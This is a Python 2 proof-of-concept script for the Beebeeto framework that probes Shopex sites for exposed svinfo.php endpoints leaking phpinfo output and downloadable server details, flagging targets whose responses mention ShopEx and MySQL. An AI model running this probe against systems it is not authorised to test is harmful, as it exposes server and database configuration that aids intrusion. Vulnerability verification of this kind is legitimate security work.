#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0129',
            'name': 'Shopex /svinfo.php phpinfo信息泄露漏洞 POC',
            'author': 'user1018',
            'create_date': '2014-10-30',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Shopex',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Shopex信息泄露', 'phpinfo泄露', 'php', 'svinfo.php'],
            'desc': '''
                    http://sitename/app/dev/svinfo.php?phpinfo=true
                    http://sitename/app/dev/svinfo.php?download=true
                    http://sitename/install/svinfo.php?phpinfo=true
                    ''',
            'references': ['N/A',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        file_list =  ['/app/dev/svinfo.php?phpinfo=true',
                      '/install/svinfo.php?phpinfo=true',
                      '/app/dev/svinfo.php?download=true']
        args['poc_ret']['file_path'] = []
        for filename in file_list:
            verify_url = args['options']['target'] + filename
            try:
                if args['options']['verbose']:
                    print '[*] Requst URL: ' + verify_url
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if 'ShopEx' in content and 'MySQL' in content:
                args['success'] = True
                args['poc_ret']['file_path'].append(verify_url)
        if not args['poc_ret']['file_path']:
            args['poc_ret'].pop('file_path')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())